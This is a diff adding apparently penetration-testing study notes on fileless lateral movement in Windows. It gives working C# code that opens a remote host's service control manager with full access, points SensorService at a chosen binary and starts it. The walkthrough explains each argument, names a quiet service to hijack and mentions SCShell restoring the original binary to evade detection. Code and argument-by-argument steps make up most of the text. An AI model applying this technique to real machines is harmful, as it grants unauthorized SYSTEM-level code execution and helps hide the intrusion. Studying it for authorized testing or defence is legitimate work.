+        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
+
+        [DllImport("advapi32", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
+
+
+        static void Main(string[] args)
+        {
+            String target = "appsrv01";
+
+            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
+
+            string ServiceName = "SensorService";
+            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
+
+            string payload = "notepad.exe";
+            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
+
+            bResult = StartService(schService, 0, null);
+        }
+    }
+}
+```
+
+The first argument is the hostname of the target machine, or appsrv01 in our case. We'll set the second argument (the database name) to null and the third argument to the desired access right to the service control manager. We'll request SC_MANAGER_ALL_ACCESS (full access), which has a numerical value of 0xF003F.
+
+Once the authentication is complete, we must open an existing service. To avoid any issues, we must select a service that is not vital to the function of the OS and is not in use by default.
+
+One candidate is **SensorService**, which manages various sensors. This service is present on both Windows 10 and Windows 2016/2019 by default but is not run automatically at boot.
+
+The API we need to use is **OpenService**
+
+- As the first argument (hSCManager), we must supply the handle to the service control manager we received from OpenSCManager. 
+- The second parameter (lpServiceName) is the name of the service ("SensorService") and
+- The last argument (dwDesiredAccess) is the desired access to the service.
+We can request full access (SERVICE_ALL_ACCESS), which has a numerical value of 0xF01FF.
+
+After the SensorService service has been opened, we must change the service binary with the **ChangeServiceConfigA** API.
+
+1. The first (hService) is the handle to the service we obtained from calling OpenService.
+
+2. dwServiceType allows us to specify the type of the service. We only want to modify the service binary so we'll specify SERVICE_NO_CHANGE by its numerical value, 0xffffffff.
+
+3. We can modify the service start options through the dwStartType. Since we want to have the service start once we have modified the service binary, we'll set it to SERVICE_DEMAND_START (0x3).
+
+4. dwErrorControl will set the error action and we'll specify SERVICE_NO_CHANGE (0) to avoid modifying it.
+
+5. lpBinaryPathName contains the path of the binary that the service will execute when started. This is what we want to update and as an initial proof of concept, we'll set this to "notepad.exe".
+
+6. The final six arguments are not relevant to us and we can set them to null.
+
+Once the proof of concept is compiled, we can execute it on the Windows 10 client in the context of the dave user. This will change the service binary of SensorService to `notepad.exe`.
+ 
+The final step is to start the service, which we can do through the **StartService** API.
+
+1. hService is the service handle created by OpenService.
+
+2. The third argument (*lpServiceArgVectors) is an array of strings that are passed as arguments to the service. We do not require any so we can set it to null and then set dwNumServiceArgs, which is the number of arguments, to 0 as well.
+
+Once this code has been added to the project, we can compile and execute it in the context of the dave user. On appsrv01, we find the Notepad process running as SYSTEM
+ 
+Since Notepad is not a service executable, the service control manager will terminate the process after a short period of time, but we have obtained the code execution we desire.
+
+**SCShell** (https://github.com/Mr-Un1k0d3r/SCShell) has been implemented in C#, C, and Python. It also uses the **QueryServiceConfig** API to detect the original service binary. After we have obtained code execution, SCShell will restore the service binary back to its original state to further aid evasion.
+
 # Microsoft SQL Attacks
+
+
 
 # Active Directory Exploitation
 
